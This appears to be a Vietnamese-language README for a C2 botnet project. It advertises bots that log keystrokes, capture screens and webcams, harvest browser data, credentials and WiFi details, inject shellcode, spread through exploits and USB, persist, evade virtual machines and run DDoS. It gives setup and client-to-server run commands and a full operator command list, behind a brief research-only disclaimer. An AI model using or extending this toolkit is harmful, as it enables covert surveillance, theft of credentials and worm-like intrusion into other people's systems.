# C2C BOTNET


Đây là một hệ thống C&c Server Botnet nâng cao, kết hợp các tính năng từ 3 dự án:
- [CnC-Botnet-in-Python](https://github.com/marcorosa/CnC-Botnet-in-Python)
- [FleX](https://github.com/flex-master)
- [NetWorm](https://github.com/pylyf/NetWorm)

Hệ thống này được thiết kế để nghiên cứu về an ninh mạng và phát triển kỹ năng phòng thủ. Dự án cung cấp một nền tảng hoàn chỉnh để hiểu cách malware hoạt động và cách ngăn chặn chúng.

## Tính năng

### Server
- Quản lý và điều khiển nhiều bot đồng thời
- Giao diện console tương tác với nhiều lệnh
- Hỗ trợ kết nối SSH với mã hóa
- Theo dõi trạng thái bot theo thời gian thực
- Quản lý dữ liệu thu thập từ bot
- Quét và tìm kiếm mục tiêu mới
- Phân tích mạng và thông tin hệ thống

### Client/Bot
1. Chức năng Theo dõi:
- Keylogger nâng cao
- Chụp màn hình từ xa
- Thu thập thông tin hệ thống chi tiết
- Theo dõi tiến trình và dịch vụ

2. Điều khiển Hệ thống:
- Thực thi lệnh shell
- Inject shellcode/DLL
- Điều khiển tiến trình
- Truy cập file system

3. Tự động Lây lan:
- Quét mạng tìm mục tiêu
- Khai thác các lỗ hổng phổ biến
- Lây lan qua USB
- Tự động tìm và lây nhiễm mục tiêu mới

4. Persistence:
- Nhiều cơ chế tự khởi động
- Duy trì quyền truy cập
- Xóa dấu vết
- Chống phát hiện và gỡ bỏ

5. Bảo mật:
- Mã hóa tất cả giao tiếp
- Phát hiện môi trường ảo hóa
- Nhiều lớp xác thực
- Tự động phục hồi kết nối

## Cài đặt

1. Clone repository:
```bash
git clone https://github.com/letho1608/c2c_botnet
cd c&c-server
```

2. Cài đặt dependencies:
```bash
pip install -r requirements.txt
```

### Yêu cầu hệ thống
- Python 3.8 hoặc cao hơn
- Windows 10/11 (cho một số module client)
- Linux (cho server hoặc một số module client)
- Quyền admin cho một số chức năng

## Sử dụng

### Khởi động Server:
```bash
python server.py
```

### Tạo và chạy Client:
```bash
python client.py <server_host> <server_port>
```

### Các lệnh Console:

### Quản lý Bot
- `list` - Hiển thị danh sách bot đang kết nối
- `scan [subnet]` - Quét mạng tìm mục tiêu mới
- `spread <target>` - Lây lan tới mục tiêu cụ thể
- `info <bot_id>` - Hiển thị thông tin chi tiết về bot

### Theo dõi và Thu thập
- `keylogger <bot_id> <start|stop|dump>` - Điều khiển keylogger
- `advanced_keylog <bot_id> <options>` - Keylogger nâng cao với nhiều tùy chọn
- `screenshot <bot_id>` - Chụp màn hình từ xa
- `webcam <bot_id> <capture|stream>` - Chụp hình hoặc stream từ webcam
- `sysinfo <bot_id>` - Lấy thông tin hệ thống
- `ps <bot_id>` - Liệt kê tiến trình đang chạy
- `browser <bot_id> <browser>` - Thu thập dữ liệu từ trình duyệt
- `wifi <bot_id>` - Thu thập thông tin về các mạng WiFi
- `credentials <bot_id> <type>` - Thu thập thông tin đăng nhập

### Điều khiển Hệ thống
- `shell <bot_id> <command>` - Thực thi lệnh shell
- `inject shellcode <bot_id> <base64_shellcode> [pid]` - Inject shellcode
- `inject dll <bot_id> <pid> <dll_path>` - Inject DLL
- `kill <bot_id> <pid>` - Dừng tiến trình
- `migrate <bot_id> <pid>` - Di chuyển payload sang tiến trình khác
- `schedule <bot_id> <time> <command>` - Lập lịch thực thi lệnh

### Persistence
- `persist <bot_id> install` - Cài đặt persistence
- `persist <bot_id> cleanup` - Xóa dấu vết
- `persist <bot_id> check` - Kiểm tra trạng thái persistence
- `persist <bot_id> method <method_name>` - Cài đặt persistence với phương thức cụ thể

### File Operations
- `upload <bot_id> <local_path> <remote_path>` - Upload file
- `download <bot_id> <remote_path> <local_path>` - Download file
- `ls <bot_id> <path>` - Liệt kê file
- `rm <bot_id> <path>` - Xóa file
- `search <bot_id> <pattern>` - Tìm kiếm file

### Mạng và Lây lan
- `network_map <subnet>` - Tạo sơ đồ mạng
- `lateral <bot_id> <method> <target>` - Di chuyển ngang trong mạng
- `exploit <target> <exploit_name>` - Khai thác lỗ hổng trên mục tiêu
- `pivot <bot_id>` - Sử dụng bot làm điểm truy cập vào mạng

### An ninh và Bảo vệ
- `obfuscate <payload>` - Làm rối mã nhị phân
- `encrypt <file> <key>` - Mã hóa file
- `anti_vm <bot_id> <enable|disable>` - Bật/tắt phát hiện môi trường ảo
- `security <level>` - Thiết lập mức độ bảo mật

## Cấu trúc Project
```
d:\Code\c&c server\
│
├── server.py           # Server chính
├── client.py           # Client/Bot chính
├── remote_control.py   # Điều khiển từ xa
├── requirements.txt    # Dependencies
├── FEATURES.md         # Mô tả tính năng chi tiết
├── UPGRADE_PLAN.md     # Kế hoạch nâng cấp
│
├── core/               # Core server
│   ├── server.py       # Xử lý kết nối
│   ├── console.py      # Console UI
│   ├── exploit_builder.py  # Tạo exploit
│   ├── host_manager.py     # Quản lý host
│   ├── multiple_servers.py # Điều phối nhiều server
│   ├── plugin_system.py    # Hệ thống plugin
│   └── reporting.py        # Báo cáo và phân tích
│
├── botnet/             # Quản lý botnet
│   └── manager.py      # Bot Manager
│
├── gui/                # Giao diện đồ họa
│   ├── interface.py    # Giao diện desktop
│   ├── web_interface.py # Giao diện web
│   └── templates/      # Templates HTML
│       └── dashboard.html # Dashboard chính
│
├── network/            # Network & Spreading
│   ├── scanner.py      # Network Scanner
│   ├── lateral_movement.py # Di chuyển ngang
│   ├── network_discovery.py # Khám phá mạng
│   ├── signatures.yaml # Chữ ký nhận dạng
│   └── spreading.py    # Phương thức lây lan
│
├── payload/            # Client modules  
│   └── modules/
│       ├── advanced_keylogger.py # Keylogger nâng cao
│       ├── anti_analysis.py      # Chống phân tích
│       ├── browser_harvester.py  # Thu thập dữ liệu trình duyệt
│       ├── credential_harvester.py # Thu thập thông tin đăng nhập
│       ├── data_harvester.py     # Thu thập dữ liệu
│       ├── ddos.py               # Tấn công DDoS
│       ├── keylogger.py          # Ghi lại phím bấm
│       ├── media_capture.py      # Thu thập media
│       ├── persistence.py        # Duy trì quyền truy cập
│       ├── process_migration.py  # Di chuyển giữa các tiến trình
│       ├── scheduler.py          # Lập lịch tác vụ
│       ├── screenshot.py         # Chụp màn hình
│       ├── shellcode.py          # Thực thi shellcode
│       ├── sysinfo.py            # Thông tin hệ thống
│       ├── webcam.py             # Truy cập webcam
│       └── wifi_harvester.py     # Thu thập thông tin WiFi
│
└── utils/              # Utilities
    ├── advanced_crypto.py        # Mã hóa nâng cao
    ├── advanced_protection.py    # Bảo vệ nâng cao
    ├── anti_vm.py                # Phát hiện môi trường ảo hóa
    ├── cert_pinning.py           # Gắn chứng chỉ
    ├── code_obfuscation.py       # Làm rối mã nguồn
    ├── crypto.py                 # Mã hóa cơ bản
    ├── integrity.py              # Kiểm tra tính toàn vẹn
    ├── logger.py                 # Ghi log
    ├── memory_protection.py      # Bảo vệ bộ nhớ
    ├── network_protection.py     # Bảo vệ kết nối mạng
    └── security_manager.py       # Quản lý bảo mật
```

## Cảnh báo và Mục đích Sử dụng

Dự án này được phát triển và chia sẻ **CHỈ** nhằm mục đích:
- Nghiên cứu về an ninh mạng
- Phát triển kỹ năng phòng thủ
- Hiểu rõ cách thức hoạt động của malware
- Học tập và giáo dục về bảo mật

Tuyệt đối **KHÔNG** sử dụng cho các mục đích:
- Xâm nhập trái phép vào hệ thống máy tính
- Đánh cắp thông tin cá nhân
- Gây hại cho người dùng hoặc hệ thống
- Bất kỳ hoạt động bất hợp pháp nào

Việc sử dụng mã nguồn này phải tuân thủ tất cả luật pháp và quy định liên quan đến an ninh mạng trong khu vực của bạn.

## Tính năng nâng cao

Dự án này triển khai một số tính năng nâng cao để mô phỏng các kỹ thuật được sử dụng bởi malware thực tế:

1. **Đa dạng phương thức persistence**: Triển khai nhiều cơ chế để duy trì quyền truy cập, giúp hiểu rõ cách malware duy trì sự hiện diện trên hệ thống.

2. **Kỹ thuật chống phân tích**: Phát hiện môi trường ảo hóa, chống debug và phân tích tĩnh.

3. **Phòng tránh phát hiện**: Sử dụng mã hóa, đóng gói và kỹ thuật làm rối mã để tránh bị phát hiện.

4. **Hệ thống C2 đa dạng**: Hỗ trợ nhiều kênh liên lạc và cơ chế dự phòng.

Những tính năng này giúp các chuyên gia bảo mật hiểu rõ hơn về cách thức hoạt động của malware và phát triển biện pháp phòng thủ hiệu quả.

## Phát triển

Dự án có cấu trúc mô-đun hóa, cho phép dễ dàng mở rộng và thêm tính năng mới:

1. **Tạo module mới**:
   - Thêm tệp mới vào thư mục `payload/modules/`
   - Tuân thủ API module đã được định nghĩa

2. **Cập nhật server**:
   - Mở rộng logic xử lý trong `core/`
   - Thêm lệnh mới vào console trong `core/console.py`

3. **Cải thiện UI**:
   - Phát triển giao diện trong `gui/`
   - Tùy chỉnh dashboard và báo cáo

## Giấy phép
Dự án được phân phối dưới giấy phép MIT.